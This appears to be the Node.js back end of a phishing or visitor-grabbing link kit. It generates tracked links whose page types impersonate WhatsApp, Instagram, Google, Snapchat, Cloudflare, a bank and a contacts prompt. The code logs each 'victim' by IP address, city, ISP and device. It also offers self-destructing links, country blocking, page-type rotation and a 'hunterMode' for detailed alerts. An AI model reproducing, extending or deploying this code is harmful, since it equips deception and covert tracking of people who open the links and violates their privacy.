/**
 * ═══════════════════════════════════════════════════════
 *   نظام إدارة الروابط المتقدم — Advanced Link Manager
 * ═══════════════════════════════════════════════════════
 */
'use strict';
const fs     = require('fs');
const crypto = require('crypto');

const LINKS_FILE = './links_db.json';

let db = {};
try { db = JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8')); } catch(e) { db = {}; }

function save() {
  try { fs.writeFileSync(LINKS_FILE, JSON.stringify(db)); } catch(e) {}
}

// ── Backup to GitHub (optional, silently fails) ───────────────────────────────
let _ghBackup = null;
function setGHBackup(fn) { _ghBackup = fn; }
function doBackup() {
  if (_ghBackup) _ghBackup(LINKS_FILE, '_data/links_db.json').catch(() => {});
}

// ── ID generation ─────────────────────────────────────────────────────────────
function genId(n = 8) {
  let id;
  do { id = crypto.randomBytes(n).toString('base64url').slice(0, n); } while (db[id]);
  return id;
}

// ── Type metadata ─────────────────────────────────────────────────────────────
const TYPE_META = {
  webview:    { label: 'WebView',    emoji: '🌐', view: 'webview'    },
  cloudflare: { label: 'Cloudflare', emoji: '☁️', view: 'cloudflare' },
  whatsapp:   { label: 'WhatsApp',   emoji: '💬', view: 'whatsapp'   },
  instagram:  { label: 'Instagram',  emoji: '📷', view: 'instagram'  },
  tiktok:     { label: 'TikTok',     emoji: '🎵', view: 'tiktok'     },
  google:     { label: 'Google',     emoji: '🔵', view: 'google'     },
  snapchat:   { label: 'Snapchat',   emoji: '👻', view: 'snapchat'   },
  youtube:    { label: 'YouTube',    emoji: '▶️', view: 'youtube'    },
  download:   { label: 'Download',   emoji: '📥', view: 'download'   },
  contacts:   { label: 'Contacts',   emoji: '📞', view: 'contacts'   },
  bank:       { label: 'Bank',       emoji: '🏦', view: 'bank'       },
};

function getTypeMeta(type) {
  return TYPE_META[type] || { label: type, emoji: '🔗', view: 'webview' };
}

// ── CRUD ──────────────────────────────────────────────────────────────────────
function createLink(uid, type, url, opts = {}) {
  const lid = genId(8);
  db[lid] = {
    uid:         Number(uid),
    type,
    url,
    label:       opts.label       || null,
    alias:       opts.alias       || null,
    active:      true,
    createdAt:   Date.now(),
    expiry:      opts.expiry      || null,   // unix ms timestamp
    maxVisits:   opts.maxVisits   || null,   // integer
    visits:      0,
    uniqueIPs:   [],
    countries:   {},                          // { 'SA': 3, 'AE': 1 }
    devices:     { mobile: 0, desktop: 0 },
    password:    opts.password    || null,
    blockedIPs:  opts.blockedIPs  || [],
    webhook:     opts.webhook     || null,
    selfDestruct:     opts.selfDestruct     || false,
    victims:          [],                          // last 100 victims
    createdHour:      new Date().getHours(),
    blockedCountries: opts.blockedCountries || [], // ['SA','AE',...]
    randomTypes:      opts.randomTypes      || false, // rotate all page types
    hunterMode:       opts.hunterMode       || false, // extra-detail notifications
  };
  save();
  doBackup();
  return { lid, link: db[lid] };
}

// Returns { ok, reason, link } — call before serving any new-style link
function checkLink(lid) {
  const l = db[lid];
  if (!l)        return { ok: false, reason: 'not_found' };
  if (!l.active) return { ok: false, reason: 'disabled' };
  if (l.expiry  && Date.now() > l.expiry)   { l.active = false; save(); return { ok: false, reason: 'expired' }; }
  if (l.maxVisits && l.visits >= l.maxVisits) { l.active = false; save(); return { ok: false, reason: 'maxed' }; }
  return { ok: true, link: l };
}

function recordVisit(lid, info = {}) {
  const l = db[lid];
  if (!l) return;

  l.visits++;

  // Unique IPs
  if (info.ip && !l.uniqueIPs.includes(info.ip)) l.uniqueIPs.push(info.ip);

  // Country stats
  if (info.country && info.country !== '?') {
    l.countries[info.country] = (l.countries[info.country] || 0) + 1;
  }

  // Device stats
  const isMobile = /mobile|android|iphone|ipad/i.test(info.ua || '');
  if (isMobile) l.devices.mobile++; else l.devices.desktop++;

  // Victim log (last 100)
  l.victims.push({
    ip:      info.ip      || '?',
    country: info.country || '?',
    city:    info.city    || '?',
    isp:     info.isp     || '?',
    ua:      (info.ua     || '?').slice(0, 120),
    device:  isMobile ? '📱 موبايل' : '💻 كمبيوتر',
    time:    new Date().toISOString(),
  });
  if (l.victims.length > 100) l.victims = l.victims.slice(-100);

  // Auto-disable checks
  if (l.maxVisits && l.visits >= l.maxVisits) l.active = false;
  if (l.selfDestruct && l.visits >= 1)        { l.active = false; }

  save();
}

function getLink(lid)      { return db[lid] || null; }
function getAllLinks()      { return db; }
function countAll()        { return Object.keys(db).length; }

function getUserLinks(uid) {
  return Object.entries(db)
    .filter(([, l]) => l.uid === Number(uid))
    .map(([lid, l]) => ({ lid, ...l }))
    .sort((a, b) => b.createdAt - a.createdAt);
}

function setActive(lid, uid, active) {
  const l = db[lid];
  if (!l || (uid != null && l.uid !== Number(uid))) return false;
  l.active = active;
  save(); doBackup();
  return true;
}

function updateLink(lid, uid, patch) {
  const l = db[lid];
  if (!l || (uid != null && l.uid !== Number(uid))) return false;
  Object.assign(l, patch);
  save(); doBackup();
  return true;
}

function deleteLink(lid, uid) {
  const l = db[lid];
  if (!l || (uid != null && l.uid !== Number(uid))) return false;
  delete db[lid];
  save(); doBackup();
  return true;
}

function blockIP(lid, uid, ip) {
  const l = db[lid];
  if (!l || (uid != null && l.uid !== Number(uid))) return false;
  if (!l.blockedIPs.includes(ip)) l.blockedIPs.push(ip);
  save();
  return true;
}

function findByAlias(alias) {
  return Object.entries(db).find(([, l]) => l.alias === alias)?.[0] || null;
}

// Global stats across all links
function globalStats() {
  let total = 0, active = 0, totalVisits = 0;
  for (const l of Object.values(db)) {
    total++;
    if (l.active) active++;
    totalVisits += l.visits || 0;
  }
  return { total, active, disabled: total - active, totalVisits };
}

module.exports = {
  createLink, checkLink, recordVisit,
  getLink, getAllLinks, countAll, getUserLinks,
  setActive, updateLink, deleteLink, blockIP,
  findByAlias, globalStats, getTypeMeta, TYPE_META,
  setGHBackup, save,
};
